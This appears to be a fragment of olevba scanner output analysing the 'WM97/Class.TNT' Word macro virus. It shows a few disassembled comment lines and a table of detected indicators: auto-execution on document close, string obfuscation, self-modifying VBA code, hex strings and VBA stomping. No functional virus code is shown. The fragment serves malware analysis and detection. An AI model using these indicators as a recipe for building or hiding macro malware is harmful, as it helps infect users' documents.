' 	QuoteRem 0x0008 0x0020 "WM97/Class.TNT by Virus :) Smile"
' Line #97:
' 	QuoteRem 0x0000 0x0056 "90722644804275301100842,49760439856575E+2190722644804275301100849072264480427530110084"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MSWord.Class        |Executable file name                         |
|Hex String|aQ)f%WQ             |61512966255751                               |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

